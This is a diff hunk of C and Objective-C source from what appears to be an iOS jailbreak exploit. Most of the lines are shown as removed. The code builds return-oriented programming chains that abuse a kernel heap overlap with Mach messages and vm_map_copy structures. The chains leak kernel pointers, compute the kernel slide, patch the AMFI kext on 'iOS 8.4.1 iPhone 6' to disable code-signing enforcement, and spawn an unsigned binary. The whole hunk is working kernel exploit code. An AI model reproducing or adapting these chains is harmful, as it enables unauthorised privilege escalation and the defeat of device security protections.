-LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
-StoreR0(PUSH, SEG_VAR(oolmsg_template_512.desc.address));\
-SendMsg(PUSH, overlapped_port, oolmsg_template_512);
-    
-    
-    
-#define step(x) \
-LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));\
-RopAddR0(PUSH, 1024 - 0x58 + x);\
-DerefR0(PUSH);\
-StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + x]))
-    
-#define tmptoscratch() \
-for (int i = 0; i < 0x58; i += 4) {\
-step(i);\
-}
-    
-    ReadWriteOverlap();
-    
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
-    
-    /* read out pointer to overlappped alloc */
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 1024 - 0x58 + 0x18);
-    DerefR0(PUSH);
-    RopAddR0(PUSH, -0x58);
-    StoreR0(PUSH, SEG_VAR(kern_alloc_1024));
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 1024 - 0x58 + 0x18 + 4);
-    DerefR0(PUSH);
-    StoreR0(PUSH, SEG_VAR(kern_alloc_1024)+4);
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_alloc_1024)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_alloc_1024),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    ReadWriteOverlap();
-    tmptoscratch();
-    WriteWhatWhere(PUSH, 500, SEG_VAR(scratch[1024 - 0x58 + 0x20]));
-    ReadWriteScratchOverlap();
-    
-    ReadWriteOverlapped512();
-    
-    ReadWriteOverlap();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
-    
-    RecvMsg(PUSH, overlapped_port, tmp_msg);
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    ReadWriteOverlap();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 1024 - 0x58);
-    DerefR0(PUSH);
-    StoreR0(PUSH, SEG_VAR(vptr));
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 1024 - 0x58 + 4);
-    DerefR0(PUSH);
-    StoreR0(PUSH, SEG_VAR(vptr)+4);
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(vptr)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(vptr),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(zero), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
-    argss->waitTime.tv_sec = 1;
-    argss->waitTime.tv_nsec = 1000000;
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(svc), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    SendMsg(PUSH, overlapped_port, oolmsg_template_512);
-    
-    ReadWriteOverlap();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
-    tmptoscratch();
-    LoadIntoR0(PUSH, SEG_VAR(vptr));
-    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
-    LoadIntoR0(PUSH, SEG_VAR(vptr)+4);
-    StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
-    WriteWhatWhere(PUSH, 4096, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
-    ReadWriteScratchOverlap();
-    
-    ReadWriteOverlapped512();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 4096, 0, 0, 0, 0, 0);
-    for (int i = 0; i < (4096); i+=4) {
-        LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-        RopAddR0(PUSH, i);
-        DerefR0(PUSH);
-        StoreR0(PUSH, SEG_VAR(kvt[i]));
-    }
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 0x18);
-    DerefR0(PUSH);
-    RopAddR0(PUSH, -0x02002000);
-    StoreR0(PUSH, SEG_VAR(kern_slide));
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp_msg.desc.address));
-    RopAddR0(PUSH, 0x18 + 4);
-    DerefR0(PUSH);
-    RopAddR0(PUSH, -0xffffff80);
-    StoreR0(PUSH, SEG_VAR(kern_slide)+4);
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 2);
-    Shift2R0(PUSH);
-    Shift2R0(PUSH);
-    RopAddR0(PUSH, -0x3);
-    StoreR0(PUSH, SEG_VAR(tmp1));
-    
-    WriteWhatWhere(PUSH, 0, SEG_VAR(kern_slide));
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp1));
-    StoreR0(PUSH, SEG_VAR(kern_slide)+2);
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 1);
-    Shift2R0(PUSH);
-    Shift2R0(PUSH);
-    StoreR0(PUSH, SEG_VAR(tmp1));
-    
-    WriteWhatWhere(PUSH, 0, SEG_VAR(kern_slide));
-    
-    LoadIntoR0(PUSH, SEG_VAR(tmp1));
-    StoreR0(PUSH, SEG_VAR(kern_slide) + 2);
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_slide)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_slide),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_slide));
-    RopAddR0(PUSH, 0x02002000);
-    StoreR0(PUSH, SEG_VAR(kern_text_base));
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_slide) + 4);
-    RopAddR0(PUSH, 0xffffff80);
-    StoreR0(PUSH, SEG_VAR(kern_text_base) + 4);
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base)+4,0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    // disable amfi on iOS 8.4.1 iPhone 6: write 1 at +0x65d290 from kernel text base
-    
-#define __ARM64_ 1
-#if 0
-    for (int i = 0; i < 20; i++) {
-        ReadWriteOverlap();
-        tmptoscratch();
-        LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
-        RopAddR0(PUSH, i*4096*8*2);
-        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18]));
-        LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
-        StoreR0(PUSH, SEG_VAR(scratch[1024 - 0x58 + 0x18 + 4]));
-        WriteWhatWhere(PUSH, 4096*8*2, SEG_VAR(scratch[1024 - 0x58 + 0x10]));
-        ReadWriteScratchOverlap();
-        
-        ReadWriteOverlapped512();
-        
-        RopCallFunction9Deref1(PUSH, @"__platform_memmove", 1, SEG_VAR(tmp_msg.desc.address), 0x54000000+i*4096*8*2, 0, 4096*8*2, 0, 0, 0, 0, 0, 0);
-    }
-#endif
-    
-    
-    RecvMsg(PUSH, overlapped_port, tmp_msg);
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceOpen), 0, SEG_VAR(svc), 1, SEG_VAR(mach_task_self), 0, 0, 0, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-
-    ReadWriteOverlap();
-    RopCallFunction9Deref2(PUSH, @"___syscall", 1, SEG_VAR(fd2), 2, SEG_VAR(tmp_msg.desc.address), SYS_write, 0, 0, 1024, 0, 0, 0, 0, 0);
-
-
-    for (int i = 0; i < 2048; i += 4) {
-        LoadIntoR0(PUSH, SEG_VAR(kvt[i]));
-        StoreR0(PUSH, SEG_VAR(scratch[i]));
-    }
-
-    for (int i = 0; i < 256; i += 4) {
-        step(i);
-    }
-    
-    for (int i = 0; i < 512; i += 4) {
-        LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58+i]));
-        StoreR0(PUSH, SEG_VAR(scratch[4096+i]));
-    }
-    
-    LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58]));
-    StoreR0(PUSH, SEG_VAR(ktmp));
-    LoadIntoR0(PUSH, SEG_VAR(scratch[1024-0x58+4]));
-    StoreR0(PUSH, SEG_VAR(ktmp)+4);
-
-    LoadIntoR0(PUSH, SEG_VAR(kern_alloc_1024));
-    RopAddR0(PUSH, -(1024));
-    RopAddR0(PUSH, 0x58);
-    StoreR0(PUSH, SEG_VAR(scratch[1024-0x58]));
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_alloc_1024)+4);
-    StoreR0(PUSH, SEG_VAR(scratch[1024-0x58+4]));
-    
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_write, 0, SEG_VAR(scratch[0]), 2048, 0, 0, 0, 0, 0);
-
-
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // where
-    RopAddR0(PUSH, (0x65d290-0xA0)); // pointer to BSS of AMFI.kext
-    StoreR0(PUSH, SEG_VAR(scratch[0x10 + 1024-0x58]));
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)+4);
-    StoreR0(PUSH, SEG_VAR(scratch[0x10 + 4 + 1024-0x58]));
-    
-    LoadIntoR0(PUSH, SEG_VAR(kern_text_base)); // gadget
-    RopAddR0(PUSH, (0xb162e0)); // pointer to write 1 gadget
-    StoreR0(PUSH, SEG_VAR(scratch[0x28]));
-
-    ReadWriteScratchOverlap();
-    
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_io_connect_add_client), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    for (int i = 0; i < 512; i += 4) {
-        LoadIntoR0(PUSH, SEG_VAR(scratch[4096+i]));
-        StoreR0(PUSH, SEG_VAR(scratch[1024-0x58+i]));
-    }
-
-    ReadWriteScratchOverlap();
-    
-    strcpy(argss->spawnpath, "/var/mobile/Media/drugs");
-    argss->spawnp[0] = SEG_VAR(spawnpath);
-    argss->spawnp[1] = 0;
-    
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd2), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
-    RopCallFunction9Deref1(PUSH, @"___syscall", 1, SEG_VAR(fd1), SYS_close, 0, 0, 0, 0, 0, 0, 0, 0);
-    
- 
-    [dy setSlide:dy.slide+1]; // enter thumb
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceClose), 0, SEG_VAR(gasgauge_), 1, SEG_VAR(gasgauge_), 0, 0, 0, 0, 0, 0, 0, 0, 0,0);
-    RopCallDerefFunctionPointer10Deref2(PUSH, SEG_VAR(_IOServiceWaitQuiet), 0, SEG_VAR(svc), 5, SEG_VAR(zero), 0, SEG_VAR(waitTime), 0, 0, 0, 0, 0, 0, 0,0);
-    [dy setSlide:dy.slide-1]; // exit thumb
-    
-    for (int i = 0; i < 200; i++) {
-        SendMsg(PUSH, i, oolmsg_template_512);
-    }
-    
-    ReadWriteOverlap();
-    tmptoscratch();
-    WriteWhatWhere(PUSH, 0xFFFFFFFF, SEG_VAR(scratch[0x20+1024-0x58]));
-    ReadWriteScratchOverlap();
-    
-    
-    
-    RopCallFunction3(PUSH, @"___syscall", SYS_chmod, SEG_VAR(spawnpath), 0755);
-    RopCallFunction7(PUSH, @"___syscall", SYS_posix_spawn, m_m_scratch, SEG_VAR(spawnpath), 0, 0, SEG_VAR(spawnp), 0);
-
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    RecvMsg(PUSH, 300, tmp_msg);
-    
-
-    RopCallFunction2(PUSH, @"___syscall", SYS_exit, 42);
-    
-    memset(&argss->structData[0], 0, 1024);
-    memset(&argss->structData[1024], 0x00, 1024);
-    
-    for (int i = 0; i < 125; i++) {
-        *(uint32_t *)&argss->structData[4 + (i*8)] = 1;
-    }
-    *(uint32_t *)&argss->structData[4+(120*8)] = 0xFFFFFFFF;  // indicate end
-    
-    struct vm_map_copy* vm_map_copy = (struct vm_map_copy *)&(argss->structData[1024]);
-    
-    vm_map_copy->type = 3; // type
-    vm_map_copy->sz = 0; // size
-    vm_map_copy->ptr = 0xFFFFFF8041414141;
-    vm_map_copy->kfree_size = 1024;
-    memcpy(&argss->oolbuf[1024-0x58], vm_map_copy, 0x58);
-    vm_map_copy->kfree_size = 2048;
-    
-    strcpy((char *)(vm_map_copy + 1), "qwertyoruiopzqwertyoruiopz");
-    
     
     fsz += load_cmd_seg.filesize;
+    
+    /* __ROPDATA segment */
     
     load_cmd_seg.vmaddr = 0x52000000;
     load_cmd_seg.fileoff = fsz;
     load_cmd_seg.filesize = round_page(sizeof(args_t)) + 0x1000;
     load_cmd_seg.vmsize = round_page(sizeof(args_t)) + 0x1000;
     strcpy(&load_cmd_seg.segname[0], "__ROPDATA");
-    memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
-    mh.sizeofcmds += load_cmd_seg.cmdsize;
-    mh.ncmds++;
-    memcpy(buf + fsz, argss, sizeof(args_t));
-    fsz += load_cmd_seg.filesize;
-    
-    load_cmd_seg.vmaddr = 0x54000000;
-    load_cmd_seg.fileoff = fsz;
-    load_cmd_seg.filesize = 0;
-    load_cmd_seg.vmsize = 0x600000;
-    strcpy(&load_cmd_seg.segname[0], "__KERNDUMP");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
     mh.ncmds++;
@@ -1761,7 +817,7 @@ step(i);\
         stack[(n*0x1000/4) + (c++)] = 0x52000000 - 8; // R4
         stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
         stack[(n*0x1000/4) + (c++)] = str_r0_r4_8_pop_r4r7pc; // PC
-        stack[(n*0x1000/4) + (c++)] = 0x51004000; // R4
+        stack[(n*0x1000/4) + (c++)] = 0x51000000 + STACK_OFFSET_BASE; // R4
         stack[(n*0x1000/4) + (c++)] = 0x47474747; // R7
         stack[(n*0x1000/4) + (c++)] = mov_sp_r4_pop_r4r7pc; // PC
         
